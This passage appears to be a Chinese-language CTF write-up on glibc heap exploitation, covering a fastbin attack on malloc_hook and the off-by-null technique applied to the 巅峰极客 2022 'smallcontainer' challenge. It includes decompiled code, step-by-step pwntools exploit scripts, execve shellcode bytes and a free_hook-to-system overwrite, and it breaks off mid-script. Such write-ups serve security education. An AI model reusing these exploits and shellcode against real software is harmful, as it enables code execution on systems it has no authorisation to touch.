+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#index 2</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#index 3</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#Index 4</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x61</span><span class="p">))</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># tow fastbin attack</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span> <span class="o">-</span> <span class="mh">0x16</span><span class="p">))</span>
+
+<span class="c1"># change malloc_hook</span>
+
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05</span><span class="s1">'</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">)</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="c1">#gdb.attach(p, 'b *0x400bf8')</span>
+<span class="c1">#pause()</span>
+<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'4. Exit</span><span class="se">\n</span><span class="s1">-----------------</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'1'</span><span class="p">)</span>
+<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Size:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x10</span><span class="p">))</span>
+
+<span class="n">inter</span><span class="p">()</span>
+</pre></div>
+<h2 data-content="1" id="9ae8db4bc6f6bf278ba1f8792fc06026">off by null</h2>
+<h3 data-content="1" id="8fb101dd1978aff782c0cc6c3b7f15ef">前置知识</h3>
+<p>off by null 本质上就是由于长度的检查不严谨导致了一个空字节的溢出造成的，通常我们会用它来构造Heap Overlap或是用来触发unlink。<br/>
+这些的前提是对于堆块的合并有所了解。</p>
+<h4 data-content="1" id="a2252ed9f3699c31804d87610254e6b4">向前合并与向后合并</h4>
+<h5 data-content="1" id="271b6e19eff9b6ebd3aad2ae165baeab">向前合并</h5>
+<div class="highlight"><pre><span></span><span class="cm">/* consolidate forward */</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">unlink</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">nextchunk</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+    <span class="n">size</span> <span class="o">+=</span> <span class="n">nextsize</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span>
+    <span class="n">clear_inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</pre></div>
+<p>向前合并的检查：当一个chunk被free时去检查其物理相邻后一个chunk（next chunk）的prev_inuse位，若为0则证明此块已被free，若不是则将其prev_inuse位清0，执行free操作之后返回。接下来要检查下一个chunk是不是top chunk 若是则和前一块合并，若不是则进入向前合并的流程。<br/>
+向前合并流程：</p>
+<p>让nextchunk进入unlink流程<br/>
+给size加上nextsize（同理也是表示大小上两个chunk已经合并了）</p>
+<h5 data-content="1" id="4705a7fdb34b955a14421f2f3192b022">向后合并</h5>
+<div class="highlight"><pre><span></span><span class="cm">/* consolidate backward */</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">prevsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>
+    <span class="n">size</span> <span class="o">+=</span> <span class="n">prevsize</span><span class="p">;</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span> <span class="n">prevsize</span><span class="p">));</span>
+    <span class="n">unlink</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>先检查当前堆块的prev_inuse位是否清零，若是则进入向后合并的流程：</p>
+<p>先把前一个堆块的位置找到即p-p-&gt;prev_inuse<br/>
+修改P -&gt; size为P -&gt; size + FD -&gt; size(以此来表示size大小上已经合并)<br/>
+让FD进入unlink函数</p>
+<h3 data-content="1" id="31e1b1adbc564cb3498209552a6c856c">利用姿势</h3>
+<p>和off by one不同，off by null溢出的是NULL字节即'\x00'</p>
+<p>在 size 为 0x100 的时候,溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。</p>
+<ol>
+<li>修改下一个chunk的inuser位，来unlink</li>
+<li>修改下一个chunk的size，来chunk overlap</li>
+</ol>
+<p>一定要申请以0x100整数倍大小的堆块，例0xf8,这样可以正好写到下一个chunk的prev_inuse位。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011447-0927f1fe-5710-1.png"/></p>
+<h3 data-content="1" id="54fe9f35032c6ff4702ba81674180a39">[巅峰极客 2022] samllcontainer</h3>
+<h4 data-content="1" id="cf747c9d740193733d3ea1feddf55d49">ida</h4>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">menu</span><span class="p">();</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">retnum</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">5</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&gt;</span> <span class="mi">5</span> <span class="p">)</span>
+      <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">4uLL</span><span class="o">:</span>
+        <span class="n">show</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3uLL</span><span class="o">:</span>
+        <span class="n">edit</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">1uLL</span><span class="o">:</span>
+        <span class="n">add</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">2uLL</span><span class="o">:</span>
+        <span class="n">delete</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">default</span><span class="o">:</span>
+<span class="nl">LABEL_13</span><span class="p">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice."</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Goodbye!"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kt">size_t</span> <span class="nf">add</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
+  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">16</span> <span class="p">)</span>
+      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">heappp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">sizeee</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input size: "</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">retnum</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0xFF</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x3FF</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">heappp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="n">sizeee</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<pre><code>QWORD *delete()
+{
+  _QWORD *result; // rax
+  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
+
+  printf("Input index: ");
+  v1 = (int)retnum();
+  if ( v1 &gt; 0x10 || !heappp[v1] || !sizeee[v1] )
+    exit(0);
+  free((void *)heappp[v1]);
+  heappp[v1] = 0LL;
+  result = sizeee;
+  sizeee[v1] = 0LL;
+  return result;
+}</code></pre>
+<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input index: "</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">retnum</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mh">0x10</span> <span class="o">||</span> <span class="o">!</span><span class="n">heappp</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">sizeee</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">heappp</span><span class="p">[</span><span class="n">v1</span><span class="p">],</span> <span class="n">sizeee</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+  <span class="k">return</span> <span class="n">check</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">heappp</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+<span class="p">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">show</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input index: "</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">retnum</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mh">0x10</span> <span class="o">||</span> <span class="o">!</span><span class="n">heappp</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">sizeee</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">"%lx"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">heappp</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+<span class="p">}</span>
+</pre></div>
+<h4 data-content="1" id="ac63422c9a7696b6e0ec984e3517ecc4">分析</h4>
+<p>两次利用off by null修改size域和prev_inuse位实现chunk overlap和unlink绕过</p>
+<h4 data-content="1" id="facdf1f85657ba115e2229eb9ed79a1b">过程</h4>
+<div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x250</span><span class="p">)</span> <span class="c1">#0 ~ 7</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x250</span><span class="p">)</span> <span class="c1">#0 ~ 6</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x120</span><span class="p">)</span> <span class="c1">#7</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2c0</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">' libc_base : '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</pre></div>
+<p>先泄露出libc基址</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011500-10a0aa48-5710-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="c1"># off by null -&gt; chunk overlap</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x120</span><span class="p">)</span> <span class="c1">#index 8</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)</span> <span class="c1">#0 ~ 6</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)</span> <span class="c1">#7</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#8</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span> <span class="c1">#9</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#10</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#11</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1">#index 0 ~ 6</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x11</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x11</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x310</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x1f8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">))</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="c1"># unlink attack</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011510-16af49b2-5710-1.png"/></p>
+<p>利用off by null填满tcachebin</p>
+<div class="highlight"><pre><span></span><span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x300</span><span class="p">)</span> <span class="c1">#0</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x200</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#1</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="c1">#2</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011542-29aa648e-5710-1.png"/></p>
+<p>改freehook为system</p>
+<p>接下来free一个填入了'bin/sh'的堆块即可getshell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011551-2f3fddf2-5710-1.png"/></p>
+<h4 data-content="1" id="090e1d8e51688f9387146fe232525abb">exp</h4>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">r</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">pr</span><span class="p">()</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="k">def</span> <span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">inter</span><span class="p">()</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">get_addr</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">get_sb</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc-2.27.so'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'3'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'4'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+
+<span class="c1"># leak libc_base</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x250</span><span class="p">)</span> <span class="c1">#0 ~ 7</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x250</span><span class="p">)</span> <span class="c1">#index 0 ~ 6</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x120</span><span class="p">)</span> <span class="c1">#7</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2c0</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">' libc_base : '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">dbg</span><span class="p">()</span>
+
+<span class="c1"># off by null -&gt; chunk overlap</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x120</span><span class="p">)</span> <span class="c1">#index 8</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
